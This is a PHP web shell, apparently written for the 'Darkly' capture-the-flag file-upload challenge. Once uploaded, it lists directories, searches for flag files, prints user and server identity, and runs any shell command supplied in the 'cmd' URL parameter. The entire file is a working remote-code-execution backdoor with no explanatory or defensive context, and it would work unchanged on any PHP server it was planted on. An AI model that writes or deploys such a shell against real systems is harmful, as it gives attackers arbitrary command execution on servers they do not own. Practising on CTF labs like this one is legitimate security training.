<?php
// Darkly File Upload Webshell - Get Flag!
echo "<h1>Darkly Upload RCE Success!</h1>";
echo "<pre>";

// Show current directory listing  
echo "Current dir:\n";
system("ls -la");

// Try common flag locations  
echo "\n--- Looking for flag ---\n";
system("find /var/www -name '*flag*' 2>/dev/null | head -5");
system("cat flag* 2>/dev/null || echo 'No flag here'");

// Server info  
echo "\n--- Server info ---\n";
system("pwd; whoami; id");

// Command input  
if(isset($_GET['cmd'])) {
    echo "\n--- Command: " . htmlspecialchars($_GET['cmd']) . " ---\n";
    system($_GET['cmd']);
}
?>